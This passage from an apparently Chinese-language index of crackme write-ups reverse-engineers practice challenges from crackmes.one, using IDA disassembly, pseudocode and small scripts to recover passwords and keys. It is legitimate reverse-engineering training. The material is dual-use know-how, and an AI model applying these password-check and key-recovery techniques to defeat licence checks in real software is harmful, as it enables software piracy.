for i in range(1, 10000000000): tmp = i + i if (tmp & 0xC0000000 == 0xC0000000) and ((tmp >> 20 & 0xFF) < 0x80): print(i) \u5bc6\u7801\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u80fd\u8dd1\u51fa\u8f83\u5927\u7684\u5bc6\u7801\u8303\u56f4","title":"hellokittyfan47's hellokittyfan's crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#saderieks-crackme","text":"main\u51fd\u6570 // write access to const memory has been detected, the output may be wrong! int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // eax int v5; // [esp+Ch] [ebp-1Ch] v5 = 100; while ( v5 ) { print(\"Enter the pass: \"); sub_401430(\"%14s\", aBcbHbnJa1qw); sub_401190(); if ( v3 ) v5 = 0; else dword_414160 = 1; } return 0; } .data:0041B001 aPbBfbwfjb12 db 'Pb@#bfbwfjb12',0 .data:0041B00F align 10h .data:0041B010 byte_41B010 db 6Ah ; DATA XREF: sub_401130+3A\u2191w .data:0041B010 ; sub_401130+4A\u2191w ... .data:0041B011 aU129 db '*u@129',0 .data:0041B018 byte_41B018 db 30h ; DATA XREF: sub_401190+CE\u2191w .data:0041B018 ; sub_401190+DE\u2191w ... .data:0041B019 aIDswq db 'i#Dswq',0 .data:0041B020 aBcbHbnJa1qw db 'bcb&*hbn,ja1qw',0 int sub_401430(const char *a1, ...) { int v1; // eax va_list va; // [esp+14h] [ebp+Ch] BYREF va_start(va, a1); v1 = sub_403CAC(0); return sub_401400(v1, a1, 0, va); } \u5faa\u73afloc_40136D \u4e3b\u4f53\u5faa\u73af .text:0040136D loc_40136D: ; CODE XREF: _main:loc_4013CE\u2193j .text:0040136D cmp [ebp+var_1C], 0 .text:00401371 jz short loc_4013D0 .text:00401373 push offset aEnterThePass ; \"Enter the pass: \" .text:00401378 call sub_403DEA .text:0040137D add esp, 4 .text:00401380 push offset aBcbHbnJa1qw ; \"bcb&*hbn,ja1qw\" .text:00401385 push offset a14s ; \"%14s\" .text:0040138A call sub_401430 .text:0040138F add esp, 8 .text:00401392 mov [ebp+ms_exc.registration.TryLevel], 0 .text:00401399 call sub_401190 .text:0040139E test eax, eax .text:004013A0 jz short loc_4013AB .text:004013A2 mov [ebp+var_1C], 0 .text:004013A9 jmp short loc_4013B5 .text:004013AB ; --------------------------------------------------------------------------- .text:00401371 jz short loc_4013D0 \u8fd9\u662f\u6b63\u786e\u65f6\u7684\u8df3\u8f6c\uff0c\u8df3\u5230loc_4013D0 .text:004013D0 loc_4013D0: ; CODE XREF: _main+31\u2191j .text:004013D0 xor eax, eax .text:004013D2 mov ecx, [ebp+ms_exc.registration.Next] .text:004013D5 mov large fs:0, ecx .text:004013DC pop edi .text:004013DD pop esi .text:004013DE pop ebx .text:004013DF mov esp, ebp .text:004013E1 pop ebp .text:004013E2 retn .text:004013E2 _main endp \u8f93\u5165\u5bc6\u7801\u540e\u7b2c\u4e00\u4e2a\u8c03\u7684\u51fd\u6570\u51fd\u6570sub_403DEA .text:00403DEA sub_403DEA proc near ; CODE XREF: sub_401190+65\u2191p .text:00403DEA ; sub_401190+136\u2191p ... .text:00403DEA .text:00403DEA var_20 = dword ptr -20h .text:00403DEA var_1C = dword ptr -1Ch .text:00403DEA var_18 = dword ptr -18h .text:00403DEA var_14 = dword ptr -14h .text:00403DEA var_10 = dword ptr -10h .text:00403DEA var_C = dword ptr -0Ch .text:00403DEA var_8 = dword ptr -8 .text:00403DEA var_1 = byte ptr -1 .text:00403DEA arg_0 = dword ptr 8 .text:00403DEA .text:00403DEA mov edi, edi .text:00403DEC push ebp .text:00403DED mov ebp, esp .text:00403DEF sub esp, 20h .text:00403DF2 cmp [ebp+arg_0], 0 .text:00403DF6 jnz short loc_403E0D .text:00403DF8 call sub_40A2BB .text:00403DFD mov dword ptr [eax], 16h .text:00403E03 call sub_40A1FE .text:00403E08 or eax, 0FFFFFFFFh .text:00403E0B leave .text:00403E0C retn .text:00403E0D ; --------------------------------------------------------------------------- \u7b2c\u4e8c\u4e2a\u8c03\u7684\u51fd\u6570sub_401430 text:00401430 sub_401430 proc near ; CODE XREF: _main+4A\u2191p .text:00401430 .text:00401430 var_8 = dword ptr -8 .text:00401430 var_4 = dword ptr -4 .text:00401430 arg_0 = dword ptr 8 .text:00401430 arg_4 = byte ptr 0Ch .text:00401430 .text:00401430 push ebp .text:00401431 mov ebp, esp .text:00401433 sub esp, 8 .text:00401436 lea eax, [ebp+0Ch] .text:00401439 mov [ebp-4], eax .text:0040143C mov ecx, [ebp-4] .text:0040143F push ecx .text:00401440 push 0 .text:00401442 mov edx, [ebp+8] .text:00401445 push edx .text:00401446 push 0 .text:00401448 call sub_403CAC .text:0040144D add esp, 4 .text:00401450 push eax .text:00401451 call sub_401400 .text:00401456 add esp, 10h .text:00401459 mov [ebp-8], eax .text:0040145C mov dword ptr [ebp-4], 0 .text:00401463 mov eax, [ebp-8] .text:00401466 mov esp, ebp .text:00401468 pop ebp .text:00401469 retn .text:00401469 sub_401430 endp","title":"saderiek's crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#winapiadmins-rot13-crackme","text":"\u7a0b\u5e8f\u754c\u9762 \u5173\u952e\u5bf9\u6bd4\uff0crax\u7684\u503c\u56fa\u5b9a\u4e3a0x152A\u3002\u6240\u4ee5\u8fd9\u4e2akey\u662f5418 \u7a0b\u5e8f\u903b\u8f91 __int64 start() { int v0; // eax __int64 v2; // [rsp+28h] [rbp-30h] char Buffer[32]; // [rsp+38h] [rbp-20h] BYREF sub_140001220(\"Enter Key:\"); gets_s(Buffer, 9ui64); v2 = atoi64(Buffer); sub_1400010C0(); v0 = rand(); sub_140001040(qword_140003000[v0 % 13]); if ( sub_1400010C0() == v2 ) sub_140001220(\"Correct!\\n\"); else sub_140001220(\"Please, try again\\n\"); system(\"pause\"); return 0i64; } \u8ba1\u7b97key\u7684\u5173\u952e\u4ee3\u7801 __int64 sub_1400010C0() { int v0; // eax v0 = rand(); return qword_140003000[sub_140001040(14 * (v0 % 14 + 1)) % 0xDui64]; } __int64 __fastcall sub_140001040(unsigned __int64 a1) { return (16 * ((((a1 >> 4) & 0xF0F0F0F0F0F0F0Fi64) + 13) & 0xF0F0F0F0F0F0F0Fi64)) | ((a1 & 0xF0F0F0F0F0F0F0Fi64) + 13) & 0xF0F0F0F0F0F0F0Fi64; }","title":"winapiadmin's ROT13 crackme"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#winapiadmins-xor-crackmes","text":"\u7a0b\u5e8f\u754c\u9762 \u5173\u952e\u903b\u8f91 .text:0000000140001135 mov rcx, [rsp+30h] .text:000000014000113A cmp [rsp+rax+48h], rcx .text:000000014000113F jnz short loc_14000114F .text:0000000140001141 lea rcx, aCorrect ; \"Correct!\\n\"","title":"winapiadmin's XOR crackmes"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#trappy-crack-me","text":"\u7a0b\u5e8f\u754c\u9762 \u641c\u7d22\u5b57\u7b26\u4e32\uff0c\u5b9a\u4f4d\u5230\u8df3\u8f6c\u5173\u952e\u4f4d\u7f6e \u8fd9\u91cc\u6709\u4e24\u6b21jne\uff0c\u90fd\u8df3\u8fc7\u4e86\u6b63\u786e\u63d0\u793a\u5e76\u4e14\u8df3\u5f80\u540c\u4e00\u4e2a\u4f4d\u7f6e\u3002\u6240\u4ee5\u8fd9\u91cc\u662f\u67092\u4e2a\u6761\u4ef6\u7684\u5224\u65ad\u7684\u3002 \u67e5\u770b\u53cd\u7f16\u8bd1\u4ee3\u7801\uff0c\u6709\u4e00\u4e2aand\u5224\u65ad\u3002size == v67 \uff0c\u8fd9\u4e2av67\u5e94\u8be5\u5c31\u662frbp-0x60\u5904\u7684\u503c \u8f93\u51651\uff0crbp-0x60\u6808\u4e0a\u7684\u503c\u662f5,r8\u662f1\u3002\u53ef\u731c\u5230\u5e94\u8be5\u662f\u5224\u65ad\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\uff0c\u7a0b\u5e8f\u89c4\u5b9akey\u957f\u5ea6\u662f5\u3002 \u63a5\u7740\u6bd4\u8f83key\u7684\u503c\uff0c\u7a0b\u5e8f\u7528\u4e86memcmp\u51fd\u6570\u6bd4\u8f83\u7b2c\u4e00\u4e2a\u53c2\u6570\u548c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u524dn\u4e2a\u5b57\u8282 int memcmp(const void *s1, const void *s2, size_t n); memcmp\u8c03\u7528\u5982\u56fe\uff0c\u65e0\u9700\u5173\u5fc3\u51fd\u6570\u5b9e\u73b0\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u770brcx\u3001rdx\u7684\u503c\u3002 rcx\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e3a11111\uff0c\u8f93\u5165\u7684\u5bc6\u7801 rdx\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4e3a+1TP3\uff0c\u6b63\u786e\u7684\u5bc6\u7801 r8\u662f\u6bd4\u8f83\u7684\u5b57\u8282\u6570\u3002","title":"Trappy Crack me"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#s4rs-heavenexe","text":"\u7a0b\u5e8f\u754c\u9762 \u5b9a\u4f4d\u5b57\u7b26\u4e32\u627e\u5230\u4e3b\u8981\u51fd\u6570 \u5c06\u8f93\u5165\u7684\u5bc6\u7801\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u7ed9\u4e86strlen\uff0c\u7136\u540e\u5c06strlen\u7684\u8fd4\u56de\u503c\u4e0e0x1d\u6bd4\u8f83\u3002\u53ef\u4ee5\u77e5\u9053\u5bc6\u7801\u7684\u957f\u5ea6\u5c31\u662f0x1d\uff0c\u4e5f\u5c31\u662f29\u3002 .text:00000000004015FF mov r8, rax ; Stream .text:0000000000401602 mov edx, 1Fh ; MaxCount .text:0000000000401607 lea rax, Buffer .text:000000000040160E mov rcx, rax ; Buffer .text:0000000000401611 call fgets .text:0000000000401616 lea rax, Buffer .text:000000000040161D mov rcx, rax ; Str .text:0000000000401620 call strlen .text:0000000000401625 mov [rbp-4], eax .text:0000000000401628 cmp dword ptr [rbp-4], 1Dh .text:000000000040162C jz short loc_401635 .text:000000000040162E call sub_401591 //\u63d0\u793anop\u6d41\u7a0b .text:0000000000401633 jmp short loc_401667 \u5f53\u5bc6\u7801\u957f\u5ea6\u662f29\u65f6\u4f1a\u8df3\u5165loc_401635\u5faa\u73af .text:0000000000401635 loc_401635: ; CODE XREF: sub_4015D5+57\u2191j .text:0000000000401635 mov eax, [rbp+var_4] .text:0000000000401638 sub eax, 1 .text:000000000040163B cdqe .text:000000000040163D lea rdx, Buffer .text:0000000000401644 mov byte ptr [rax+rdx], 0 .text:0000000000401648 lea rax, Buffer .text:000000000040164F mov rcx, rax .text:0000000000401652 call near ptr sub_401670 .text:0000000000401657 test eax, eax .text:0000000000401659 jz short loc_401662 .text:000000000040165B call sub_4015B3 .text:0000000000401660 jmp short loc_401667 \u8fd9\u4e2a\u5faa\u73af\u628a\u8f93\u5165\u7684\u5bc6\u7801\u4f5c\u4e3a\u53c2\u6570\u7ed9\u4e86sub_401670 .text:0000000000401670 sub_401670 proc far ; CODE XREF: sub_4015D5+7D\u2191p .text:0000000000401670 push rbp .text:0000000000401671 mov rbp, rsp .text:0000000000401674 sub rsp, 8 .text:0000000000401678 lea esi, word_4016D6 .text:000000000040167F lea edi, byte_4016F3 .text:0000000000401686 mov [rsp+8+var_4], 23h ; '#' .text:000000000040168E call $+5 .text:0000000000401693 pop rdx .text:0000000000401694 add edx, 8 .text:0000000000401697 mov [rsp], edx .text:000000000040169A retf call $+5 \u4ee3\u8868\u5f53\u524d\u5730\u5740\u7684\u6307\u4ee4\u504f\u79fb\uff0c\u5373push \u5f53\u524d\u5730\u5740+5\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u90a3\u6761\u6307\u4ee4\u3002 \u6b64\u65f6rdx\u662f0x40168e + 0x5 = 0x401693\u3002\u7136\u540e\u53c8\u52a0\u4e868\u53d8\u62100x40169B\uff0c\u6700\u540ersp\u7684\u5730\u5740\u662f0x40169b\u3002 \u51fd\u6570\u6700\u540e\u8fd4\u56de\u5230\u4e860x40169b\u5730\u5740\u3002 sub_40169B\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u903b\u8f91\u51fd\u6570\u3002 .text:000000000040169B sub_40169B proc far .text:000000000040169B xor edx, edx .text:000000000040169D .text:000000000040169D loc_40169D: ; CODE XREF: sub_40169B+20\u2193j .text:000000000040169D cmp edx, 1Dh .text:00000000004016A0 jz short loc_4016BE .text:00000000004016A2 mov al, [rsi] .text:00000000004016A4 mov bl, r8b .text:00000000004016A7 xchg ecx, esi .text:00000000004016A9 mov al, [rsi] .text:00000000004016AB xchg r9d, esi .text:00000000004016AE add bl, al .text:00000000004016B0 xchg edi, esi .text:00000000004016B2 mov al, [rsi] .text:00000000004016B4 xchg r15d, esi .text:00000000004016B7 cmp al, bl .text:00000000004016B9 jnz short loc_4016C5 .text:00000000004016BB jmp short loc_40169D .text:00000000004016BE ; --------------------------------------------------------------------------- .text:00000000004016BE .text:00000000004016BE loc_4016BE: ; CODE XREF: sub_40169B+5\u2191j .text:00000000004016BE mov eax, 1 .text:00000000004016C3 jmp short loc_4016C7 .text:00000000004016C5 ; --------------------------------------------------------------------------- .text:00000000004016C5 .text:00000000004016C5 loc_4016C5: ; CODE XREF: sub_40169B+1E\u2191j .text:00000000004016C5 xor eax, eax .text:00000000004016C7 .text:00000000004016C7 loc_4016C7: ; CODE XREF: sub_40169B+28\u2191j .text:00000000004016C7 push 33h ; '3' .text:00000000004016C9 call $+5 .text:00000000004016CE pop rdx .text:00000000004016CF add edx, 6 .text:00000000004016D2 push rdx .text:00000000004016D3 retf .text:00000000004016D3 sub_40169B endp ; sp-analysis failed \u5173\u952e\u5faa\u73af\u903b\u8f91 bool valid_pass(char *Buffer) { for (size_t i = 0; i < 29; i++) if (byte_4016F3[i] != word_4016D6[i] + Buffer[i]) return false; return true; } byte_4016F3\u548cword_4016D6\u5b9a\u4e49 .text:00000000004016D6 dw 3D97h .text:00000000004016D8 dq 38FC3924A80239B1h, 0C1750C286B32255Ah, 914B0418D7212A24h .text:00000000004016F3 db 0F9h, 0AFh, 13h, 0B4h, 75h .text:00000000004016F8 dq 0A68ACC976EA2851Ch, 80999820EE6D9FCAh, 4284BCF6C1657D3Fh \u89e3\u5bc6\u4ee3\u7801 char byte_4016F3[] = \"\\xF9\\xAF\\x13\\xB4\\x75\\x1C\\x85\\xA2\\x6E\\x97\\xCC\\x8A\\xA6\\xCA\\x9F\\x6D\\xEE\\x20\\x98\\x99\\x80\\x3F\\x7D\\x65\\xC1\\xF6\\xBC\\x84\"; char word_4016D6[] = \"\\x97\\x3D\\xB1\\x39\\x02\\xA8\\x24\\x39\\xFC\\x38\\x5A\\x25\\x32\\x6B\\x28\\x0C\\x75\\xC1\\x24\\x2A\\x21\\xD7\\x18\\x04\\x4B\\x91\\x4E\\x07\"; for (size_t i = 0; i < 29; i++) printf(\"%c\", (byte_4016F3[i] - word_4016D6[i]) & 0xff);","title":"s4r's heaven.exe"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#majorsopas-crackme0","text":"b\u51fd\u6570\u8bfb\u53d6\u8f93\u5165 .text:0000000140005FC1 sub rsp, 90h .text:0000000140005FC8 call __main .text:0000000140005FCD lea rbx, [rsp+98h+var_6C] .text:0000000140005FD2 mov rcx, rbx .text:0000000140005FD5 call b .text:0000000140001455 b proc near ; CODE XREF: main+15\u2193p .text:0000000140001455 push rbx .text:0000000140001456 sub rsp, 20h .text:000000014000145A mov rbx, rcx .text:000000014000145D lea rcx, Format ; \"Enter password: \" .text:0000000140001464 call printf .text:0000000140001469 mov rcx, rbx .text:000000014000146C add rsp, 20h .text:0000000140001470 pop rbx .text:0000000140001471 jmp gets .text:0000000140001471 b endp c\u51fd\u6570\u8ba1\u7b97\u8f93\u5165\u7684\u5b57\u7b26\u957f\u5ea6 .text:0000000140005FDA mov rcx, rbx .text:0000000140005FDD call a .text:0000000140001447 a proc near ; CODE XREF: e:loc_140001511\u2193p .text:0000000140001447 ; main+1D\u2193p .text:0000000140001447 ; DATA XREF: ... .text:0000000140001447 sub rsp, 28h .text:000000014000144B call strlen .text:0000000140001450 add rsp, 28h .text:0000000140001454 retn .text:0000000140001454 a endp loc_14000600A\u5faa\u73af\u662f\u5931\u8d25\u6d41\u7a0b\u3002 \u5f53\u8f93\u5165\u7684\u5b57\u7b26\u5c0f\u4e8e\u7b49\u4e8e7\u65f6\u5931\u8d25\u3002\u8868\u793a\u5bc6\u7801\u5927\u4e8e\u7b49\u4e8e8 .text:0000000140005FE2 cmp eax, 7 .text:0000000140005FE5 jle short loc_14000600A al\u5bc4\u5b58\u5668\u4e0e1\u8fdb\u884cand\u64cd\u4f5c\uff0c\u5224\u65adal\u5bc4\u5b58\u5668\u662f\u5426\u4e3a\u5947\u6570\u3002\u5982\u679c\u662f\u5947\u6570\u5219zf\u8bbe\u4e3a0\uff0c\u5426\u5219\u4e3a1 jnz\u5f53zf\u4f4d\u662f0\u65f6\uff08strlen\u7684\u8fd4\u56de\u503c\u662f\u5947\u6570\uff09\uff0c\u5219\u5931\u8d25\u3002\u6240\u4ee5\u5bc6\u7801\u5fc5\u987b\u662f\u5076\u6570\u3002 .text:0000000140005FE7 test al, 1 .text:0000000140005FE9 jnz short loc_14000600A \u63a5\u7740\u8c03\u7528c\u51fd\u6570\u3002 \u5f53\u8fdb\u5165loc_14000148D\u65f6\uff0c\u8fd4\u56de\u503c\u8bbe\u4e3a1\uff0c\u5e76\u9000\u51fac\u51fd\u6570\u3002 \u51fd\u6570\u7ed3\u675f\u540e\u5f53\u8fd4\u56de\u503c\u4e3a0\u65f6\uff0c\u8fdb\u5165\u5931\u8d25\u6d41\u7a0b\u3002 .text:0000000140005FEB mov rcx, rbx .text:0000000140005FEE call c .text:0000000140001476 c proc near ; CODE XREF: c+11\u2193j .text:0000000140001476 ; main+2E\u2193p .text:0000000140001476 ; DATA XREF: ... .text:0000000140001476 mov al, [rcx] .text:0000000140001478 test al, al .text:000000014000147A jz short loc_14000148D .text:000000014000147C and eax, 0FFFFFFDFh .text:000000014000147F inc rcx .text:0000000140001482 sub eax, 41h ; 'A' .text:0000000140001485 cmp al, 19h .text:0000000140001487 jbe short c .text:0000000140001489 xor eax, eax .text:000000014000148B jmp short locret_140001492 .text:000000014000148D .text:000000014000148D loc_14000148D: ; CODE XREF: c+4\u2191j .text:000000014000148D mov eax, 1 .text:0000000140001492 .text:0000000140001492 locret_140001492: ; CODE XREF: c+15\u2191j .text:0000000140001492 retn .text:0000000140001492 c endp .text:0000000140005FF3 test eax, eax .text:0000000140005FF5 jz short loc_14000600A \u4ed4\u7ec6\u770b\u770b\u8fd9\u91cc\u7684\u5c0f\u5faa\u73af mov al, [rcx] //\u5b58\u50a8\u5bc6\u7801\u7684\u5730\u5740\u7ed9rax\u4f4e8\u4f4d\uff1b\u7b2c\u4e8c\u6b21\u7531\u4e8ercx\u5730\u5740+1\uff0c\u6240\u4ee5\u6307\u5411\u4e0b\u4e00\u4e2a\u5bc6\u7801\u5b57\u7b26 test al, al //and al\uff0cal\u4e3a0\u65f6\u8df3\u8f6c\u5230loc_14000148D\uff0cloc_14000148D\u662f\u6b63\u786e\u6d41\u7a0b jz short loc_14000148D //jump zero ZF=1 and eax, 0FFFFFFDFh //eax \u4e0e0xDF and\u64cd\u4f5c inc rcx //rcx \u81ea\u52a0 sub eax, 41h ; 'A' // eax\u51cf 0x41\uff0cASCII\u662fA cmp al, 19h //al\u4e0e0x19\u6bd4\u8f83\u662f\u5426\u76f8\u7b49 jbe short c //0x19\u5927\u4e8e\u7b49\u4e8eal\u65f6\u91cd\u590d\u5faa\u73af \u8fd9\u53ef\u80fd\u662f\u904d\u5386\u68c0\u6d4b\u5bc6\u7801\u5b57\u7b26\u662f\u5426\u5408\u6cd5\u7684\u5224\u65ad for i in range(0,256): if ((i & 0xDF) - 0x41) & 0xFF <= 0x19: print(f'{hex(i)} {chr(i)}') \u6240\u4ee5\u5bc6\u7801\u7ec4\u6210\u662f\u5927\u5c0f\u5199\u7684a-z \u63a5\u4e0b\u6765\u8fd8\u6709\u4e00\u4e2ae\u51fd\u6570\uff0ce\u51fd\u6570\u8fd4\u56de\u975e0\u65f6\u7a0b\u5e8f\u8fdb\u5165\u6700\u7ec8\u7684\u6210\u529f\u63d0\u793a\u3002 .text:0000000140005FF7 mov rcx, rbx .text:0000000140005FFA call e .text:0000000140005FFF lea rcx, aCorrect ; \"Correct\" .text:0000000140006006 test eax, eax .text:0000000140006008 jnz short loc_140006011 .text:000000014000600A \u6574\u4e2ae\u51fd\u6570\u5305\u542b\u4e86\u5927\u91cf\u7684\u5faa\u73af\u3002 \u9996\u5148e\u8c03\u7528\u4e86d .text:00000001400014B7 e proc near ; CODE XREF: main+3A\u2193p .text:00000001400014B7 ; DATA XREF: .pdata:000000014000909C\u2193o ... .text:00000001400014B7 .text:00000001400014B7 var_4A = byte ptr -4Ah .text:00000001400014B7 .text:00000001400014B7 push rsi .text:00000001400014B8 push rbx .text:00000001400014B9 sub rsp, 68h .text:00000001400014BD xor esi, esi .text:00000001400014BF lea r10, [rsp+2Eh] .text:00000001400014C4 mov rdx, r10 .text:00000001400014C7 call d d\u51fd\u6570\u5982\u4e0b .text:0000000140001493 xor eax, eax .text:0000000140001495 .text:0000000140001495 loc_140001495: ; CODE XREF: d+1E\u2193j .text:0000000140001495 mov r8b, [rcx+rax] .text:0000000140001499 lea r9d, [rax+1] .text:000000014000149D test r8b, r8b .text:00000001400014A0 jz short loc_1400014B3 .text:00000001400014A2 and r9b, 1 .text:00000001400014A6 jnz short loc_1400014AE .text:00000001400014A8 mov [rdx], r8b .text:00000001400014AB inc rdx .text:00000001400014AE .text:00000001400014AE loc_1400014AE: ; CODE XREF: d+13\u2191j .text:00000001400014AE inc rax .text:00000001400014B1 jmp short loc_140001495 .text:00000001400014B3 ; --------------------------------------------------------------------------- .text:00000001400014B3 .text:00000001400014B3 loc_1400014B3: ; CODE XREF: d+D\u2191j .text:00000001400014B3 mov byte ptr [rdx], 0 .text:00000001400014B6 retn .text:00000001400014B6 d endp d\u770b\u8d77\u6765\u6709\u4e9b\u590d\u6742\uff0c\u4f46\u662f\u5728x64dbg\u4e2d\u53ef\u4ee5\u770b\u5230d\u51fd\u6570\u901a\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u4e4b\u540e\u8fd4\u56de\u4e86\u5076\u6570\u4f4d\u7684\u5b57\u7b26 \u968f\u540e\u5728loc_1400014CF\u5faa\u73af\u4e2d\u628ad\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6309\u4f4d\u53c8\u8fdb\u884c\u4e86\u8fd0\u7b97\u3002 .text:00000001400014CC mov rdx, rcx .text:00000001400014CF .text:00000001400014CF loc_1400014CF: ; CODE XREF: e+27\u2193j .text:00000001400014CF mov al, [rdx] .text:00000001400014D1 add rdx, 2 .text:00000001400014D5 test al, al .text:00000001400014D7 jz short loc_1400014E0 .text:00000001400014D9 and eax, 0Fh .text:00000001400014DC add esi, eax .text:00000001400014DE jmp short loc_1400014CF .text:00000001400014E0 ; --------------------------------------------------------------------------- .text:00000001400014E0 .text:00000001400014E0 loc_1400014E0: ; CODE XREF: e+20\u2191j .text:00000001400014E0 mov rdx, r10 .text:00000001400014E3 xor ebx, ebx .text:00000001400014E5 \u968f\u540e\u628a\u5bc6\u7801\u7684\u5947\u6570\u4f4d\u8fdb\u884c\u4e86\u5224\u65ad\uff0c\u53c8\u5c06\u5947\u6570\u4f4d\u548c\u5076\u6570\u4f4d\u8fdb\u884c%\u8fd0\u7b97\u3002\u590d\u6742\u7684\u8fd0\u7b97\u903b\u8f91\u53ef\u4ee5\u76f4\u63a5\u4e22GPT .text:00000001400014E5 loc_1400014E5: ; CODE XREF: e+58\u2193j .text:00000001400014E5 mov al, [rdx] .text:00000001400014E7 test al, al .text:00000001400014E9 jz short loc_140001511 .text:00000001400014EB lea r8d, [rax-61h] .text:00000001400014EF cmp r8b, 5 .text:00000001400014F3 ja short loc_1400014FA .text:00000001400014F5 sub eax, 57h ; 'W' .text:00000001400014F8 jmp short loc_140001507 .text:00000001400014FA ; --------------------------------------------------------------------------- .text:00000001400014FA .text:00000001400014FA loc_1400014FA: ; CODE XREF: e+3C\u2191j .text:00000001400014FA lea r8d, [rax-41h] .text:00000001400014FE cmp r8b, 5 .text:0000000140001502 ja short loc_140001539 .text:0000000140001504 sub eax, 37h ; '7' .text:0000000140001507 .text:0000000140001507 loc_140001507: ; CODE XREF: e+41\u2191j .text:0000000140001507 movsx eax, al .text:000000014000150A inc rdx .text:000000014000150D add ebx, eax .text:000000014000150F jmp short loc_1400014E5 .text:0000000140001511 ; --------------------------------------------------------------------------- .text:0000000140001511 .text:0000000140001511 loc_140001511: ; CODE XREF: e+32\u2191j .text:0000000140001511 call a .text:0000000140001516 mov ecx, eax .text:0000000140001518 lea r8d, [rsi+rax] .text:000000014000151C add ecx, ebx .text:000000014000151E cmp esi, ebx .text:0000000140001520 jge short loc_14000152A .text:0000000140001522 mov eax, ecx .text:0000000140001524 cdq .text:0000000140001525 idiv r8d .text:0000000140001528 jmp short loc_140001530 .text:000000014000152A ; --------------------------------------------------------------------------- .text:000000014000152A .text:000000014000152A loc_14000152A: ; CODE XREF: e+69\u2191j .text:000000014000152A mov eax, r8d .text:000000014000152D cdq .text:000000014000152E idiv ecx .text:0000000140001530 .text:0000000140001530 loc_140001530: ; CODE XREF: e+71\u2191j .text:0000000140001530 xor eax, eax .text:0000000140001532 test edx, edx .text:0000000140001534 setz al .text:0000000140001537 jmp short loc_14000153B .text:0000000140001539 ; --------------------------------------------------------------------------- .text:0000000140001539 .text:0000000140001539 loc_140001539: ; CODE XREF: e+4B\u2191j .text:0000000140001539 xor eax, eax .text:000000014000153B .text:000000014000153B loc_14000153B: ; CODE XREF: e+80\u2191j .text:000000014000153B add rsp, 68h .text:000000014000153F pop rbx .text:0000000140001540 pop rsi .text:0000000140001541 retn .text:0000000140001541 e endp \u6709\u591a\u4e2a\u89e3\u6cd5\uff0c\u4f46\u6700\u7b80\u5355\u7684\u5bc6\u7801\u662f8\u4e2aa","title":"majorsopa's crackme0"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/#dojass-find-the-encryptor","text":"\u641c\u7d22\u4e0d\u5230\u9519\u8bef\u63d0\u793a\uff0c\u5b57\u7b26\u88ab\u52a0\u5bc6\u4e86 crackme.401721 \u662f\u8d1f\u8d23\u52a0\u5bc6\u7684\u51fd\u6570\uff0c\u8c03\u8bd5\u5230\u8fd9\u91cc\u4e4b\u540e\u8f93\u5165\u7684\u5bc6\u7801\u8fdb\u884c\u4e86\u52a0\u5bc6 123\u52a0\u5bc6\u6210\u4e86 49 100 153 \u4ee3\u7801\u5982\u4e0b\uff0c\u633a\u590d\u6742\u7684.... .text:00401721 encode proc near ; CODE XREF: jio(std::string)+92\u2193p .text:00401721 .text:00401721 var_68 = dword ptr -68h .text:00401721 var_64 = dword ptr -64h .text:00401721 lpuexcpt = dword ptr -60h .text:00401721 fctx = SjLj_Function_Context ptr -5Ch .text:00401721 var_38 = dword ptr -38h .text:00401721 var_34 = dword ptr -34h .text:00401721 var_1C = byte ptr -1Ch .text:00401721 var_18 = byte ptr -18h .text:00401721 var_14 = dword ptr -14h .text:00401721 var_10 = dword ptr -10h .text:00401721 var_8 = byte ptr -8 .text:00401721 arg_0 = dword ptr 8 .text:00401721 arg_4 = dword ptr 0Ch .text:00401721 .text:00401721 push ebp .text:00401722 mov ebp, esp .text:00401724 sub esp, 88h .text:0040172A lea eax, [ebp+var_8] .text:0040172D mov [ebp+fctx.personality], offset ___gxx_personality_sj0 .text:00401734 mov [ebp+fctx.lsda], offset word_4868B2 .text:0040173B mov [ebp+var_38], offset loc_401838 .text:00401742 mov [ebp+var_34], esp .text:00401745 mov [ebp+fctx.jbuf], eax .text:00401748 lea eax, [ebp+fctx] .text:0040174B mov [esp], eax ; this .text:0040174E call __Unwind_SjLj_Register .text:00401753 ; __unwind { // ___gxx_personality_sj0 .text:00401753 ; try { .text:00401753 mov ecx, [ebp+arg_0] .text:00401756 mov [ebp+fctx.call_site], 0FFFFFFFFh .text:0040175D call __ZNSsC1Ev ; std::string::string(void) .text:00401762 mov eax, [ebp+arg_4] .text:00401765 mov ecx, [ebp+arg_4] .text:00401768 mov eax, [eax] .text:0040176A mov [ebp+lpuexcpt], eax .text:0040176D call __ZNKSs3endEv ; std::string::end(void) .text:00401772 mov [ebp+var_68], eax .text:00401775 .text:00401775 loc_401775: ; CODE XREF: encode+112\u2193j .text:00401775 mov edx, [ebp+var_68] .text:00401778 cmp [ebp+lpuexcpt], edx .text:0040177B jz loc_40188B .text:00401781 mov eax, [ebp+lpuexcpt] .text:00401784 movsx eax, byte ptr [eax] .text:00401787 mov [ebp+var_64], eax .text:0040178A mov eax, [ebp+arg_0] .text:0040178D mov [esp+4], eax .text:00401791 lea eax, [ebp+var_14] .text:00401794 mov [esp], eax ; std::string * .text:00401797 mov [ebp+fctx.call_site], 1 .text:0040179E call __Z2spRKSs ; sp(std::string const&) .text:004017A3 mov eax, [ebp+var_10] .text:004017A6 sub eax, [ebp+var_14] .text:004017A9 sar eax, 2 .text:004017AC inc eax 